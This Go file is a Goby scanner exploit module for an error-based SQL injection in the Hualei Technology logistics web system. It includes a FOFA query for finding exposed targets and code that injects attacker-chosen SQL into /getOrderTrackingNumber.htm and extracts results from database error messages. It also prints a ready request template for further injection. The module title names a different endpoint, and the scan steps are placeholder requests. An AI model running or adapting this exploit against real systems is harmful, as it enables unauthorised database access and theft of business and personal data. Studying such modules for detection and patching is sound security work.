package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Hualei Technology /modifyInsurance.htm SQL Injection Vulnerability",
    "Description": "<p>Shenzhen Huali Logistics and Information Technology Co., Ltd., established in 2013, is a professional provider of information technology services. Utilizing cutting-edge scientific technologies, we focus on delivering efficient and high-quality information technology solutions and products for logistics companies.</p>",
    "Product": "Hualei Technology",
    "Homepage": "http://www.sz56t.com/",
    "DisclosureDate": "2024-07-26",
    "PostTime": "2024-07-26",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"l_c_bar\" && body=\"华磊科技\"",
    "GobyQuery": "body=\"l_c_bar\" && body=\"华磊科技\"",
    "Level": "2",
    "Impact": "<p>Data Leakage:Attackers can use SQL injection to access sensitive data such as user credentials, personal information, or business data.Data Corruption:Attackers can modify, delete, or corrupt data in the database, leading to loss of data integrity and business functionality.System Control:Advanced SQL injection attacks can grant attackers system-level control over the database server, potentially giving them full control of the server.Service Disruption:SQL injection can cause disruptions in database services or degrade performance, impacting normal business operations.Privilege Escalation:Attackers might exploit SQL injection vulnerabilities to escalate their privileges, gaining access to administrative or other high-level user privileges.</p>",
    "Recommendation": "<p>Use Parameterized Queries (Prepared Statements):By using parameterized queries or prepared statements, user input is treated as a parameter rather than being directly embedded in SQL queries, which prevents SQL injection attacks.</p><p>Use Stored Procedures:Encapsulate SQL queries within stored procedures to ensure that user input is not mixed directly with SQL query code. Stored procedures help reduce the risk of SQL injection.</p><p>Input Validation and Data Sanitization:Implement strict validation and sanitization of user input to ensure it conforms to expected formats and prevents malicious data from entering the system. Use whitelisting to filter valid input.</p><p>Use ORM Frameworks:Utilize Object-Relational Mapping (ORM) frameworks, which typically handle SQL injection issues and provide secure APIs for database interactions.</p><p>Minimize Database Permissions:Configure database users with the principle of least privilege, ensuring that the application only has the minimal permissions necessary for its functionality, reducing potential impact from SQL injection attacks.</p><p>Regular Security Audits and Code Reviews:Conduct regular security audits and code reviews of applications to detect and address potential SQL injection vulnerabilities in a timely manner.</p><p>Use Web Application Firewalls (WAFs):Deploy Web Application Firewalls (WAFs) to detect and block SQL injection attacks. WAFs can filter and intercept malicious traffic.</p><p>Avoid Dynamic SQL:Avoid using dynamic SQL statements in code, especially those that include user input. Instead, use fixed SQL templates to mitigate the risk.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "CURRENT_SCHEMA",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "华磊科技物流系统 /modifyInsurance.htm SQL注入漏洞",
            "Product": "华磊物流通信息科技有限公司",
            "Description": "<p>深圳华磊物流通信息科技有限公司成立于2013年，是专业的信息化服务提供商，运用前沿科学技术，我们专注于为物流企业提供高效,优质的信息化解决方案和信息化产品服务。<br></p>",
            "Recommendation": "<p>使用参数化查询（Prepared Statements）：通过参数化查询或预编译语句，可以将用户输入作为参数传递给数据库，避免将其直接嵌入 SQL 查询中，从而防止 SQL 注入攻击。</p><p>使用存储过程（Stored Procedures）：使用存储过程来封装 SQL 查询，确保用户输入不会直接与 SQL 查询代码混合。存储过程可以帮助减少 SQL 注入风险。</p><p>输入验证和数据清理：对用户输入进行严格的验证和清理，确保其符合预期格式，避免恶意数据进入系统。可以使用白名单机制来过滤合法输入。</p><p>使用 ORM 框架：使用对象关系映射（ORM）框架，这些框架通常会自动处理 SQL 注入问题，并提供安全的 API 来与数据库交互。</p><p>最小化数据库权限：以最小权限原则配置数据库用户，确保应用程序只拥有执行其功能所需的最小权限，减少 SQL 注入攻击带来的潜在危害。</p><p>定期进行安全审计和代码审查：定期对应用程序进行安全审计和代码审查，检测潜在的 SQL 注入漏洞，并及时修复。</p><p>使用 Web 应用防火墙（WAF）：部署 Web 应用防火墙（WAF）来检测和阻止 SQL 注入攻击。WAF 可以过滤和拦截恶意流量。</p><p>避免动态 SQL：避免在代码中使用动态 SQL 语句，特别是当这些语句包含来自用户输入的内容时。尽量使用固定的 SQL 模板。<br></p>",
            "Impact": "<p>数据泄露：攻击者可以通过 SQL 注入获取到敏感数据，例如用户凭证、个人信息、商业数据等。数据破坏：攻击者可以修改、删除或破坏数据库中的数据，导致数据完整性和业务功能的丧失。系统控制：高级的 SQL 注入攻击可以允许攻击者获取数据库服务器的系统级控制权限，进而获得服务器的完全控制。服务中断：SQL 注入可以导致数据库服务的中断或性能下降，从而影响正常的业务运营。权限提升：攻击者可能利用 SQL 注入漏洞提升自己的权限，获取管理员或其他高权限用户的权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Hualei Technology /modifyInsurance.htm SQL Injection Vulnerability",
            "Product": "Hualei Technology",
            "Description": "<p>Shenzhen Huali Logistics and Information Technology Co., Ltd., established in 2013, is a professional provider of information technology services. Utilizing cutting-edge scientific technologies, we focus on delivering efficient and high-quality information technology solutions and products for logistics companies.<br></p>",
            "Recommendation": "<p>Use Parameterized Queries (Prepared Statements):By using parameterized queries or prepared statements, user input is treated as a parameter rather than being directly embedded in SQL queries, which prevents SQL injection attacks.</p><p>Use Stored Procedures:Encapsulate SQL queries within stored procedures to ensure that user input is not mixed directly with SQL query code. Stored procedures help reduce the risk of SQL injection.</p><p>Input Validation and Data Sanitization:Implement strict validation and sanitization of user input to ensure it conforms to expected formats and prevents malicious data from entering the system. Use whitelisting to filter valid input.</p><p>Use ORM Frameworks:Utilize Object-Relational Mapping (ORM) frameworks, which typically handle SQL injection issues and provide secure APIs for database interactions.</p><p>Minimize Database Permissions:Configure database users with the principle of least privilege, ensuring that the application only has the minimal permissions necessary for its functionality, reducing potential impact from SQL injection attacks.</p><p>Regular Security Audits and Code Reviews:Conduct regular security audits and code reviews of applications to detect and address potential SQL injection vulnerabilities in a timely manner.</p><p>Use Web Application Firewalls (WAFs):Deploy Web Application Firewalls (WAFs) to detect and block SQL injection attacks. WAFs can filter and intercept malicious traffic.</p><p>Avoid Dynamic SQL:Avoid using dynamic SQL statements in code, especially those that include user input. Instead, use fixed SQL templates to mitigate the risk.<br></p>",
            "Impact": "<p>Data Leakage:Attackers can use SQL injection to access sensitive data such as user credentials, personal information, or business data.Data Corruption:Attackers can modify, delete, or corrupt data in the database, leading to loss of data integrity and business functionality.System Control:Advanced SQL injection attacks can grant attackers system-level control over the database server, potentially giving them full control of the server.Service Disruption:SQL injection can cause disruptions in database services or degrade performance, impacting normal business operations.Privilege Escalation:Attackers might exploit SQL injection vulnerabilities to escalate their privileges, gaining access to administrative or other high-level user privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10979"
}`

	sendPayload1717485484 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/getOrderTrackingNumber.htm?documentCode=`
		payload := "1%27and%0a1=" + sql + `::integer` + "--"
		// "user::integer--"
		cfg := httpclient.NewGetRequestConfig(uri + payload)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "获取异常org.apache.ibatis.exceptions.PersistenceException") {
			return nil, errors.New("not info")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload1717485484
			// feature := goutils.RandomHexString(8)
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `user`
			resp, err := sendPayload(hostInfo, sql)
			pattern := `ERROR: invalid input syntax for integer: \\"(.*?)\\"`
			re := regexp.MustCompile(pattern)
			match := re.FindStringSubmatch(resp.Utf8Html)
			if len(match) < 1 {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/getOrderTrackingNumber.htm?documentCode=`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload1717485484
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			// feature := goutils.RandomHexString(8)
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// expResult.Output = respResult
				if !strings.Contains(resp.Utf8Html, "获取异常org.apache.ibatis.exceptions.PersistenceException") {
					expResult.Output = `漏洞利用失败:`
					expResult.Success = false
					return expResult
				}
				pattern := `ERROR: invalid input syntax for integer: \\"(.*?)\\"`
				re := regexp.MustCompile(pattern)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) > 1 {
					expResult.Success = true
					expResult.Output = `The key points you need to extract is : ` + match[1]
					return expResult
					// extractedString := match[1]
					// fmt.Println(extractedString)
				} else {
					expResult.Output = `漏洞利用失败:`
					expResult.Success = false
					return expResult
				}

			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `GET /getOrderTrackingNumber.htm?documentCode=1%27and%0a1=` + "YOURPAYLOAD" + `::integer-- HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
`
			}
			return expResult
		},
	))
}
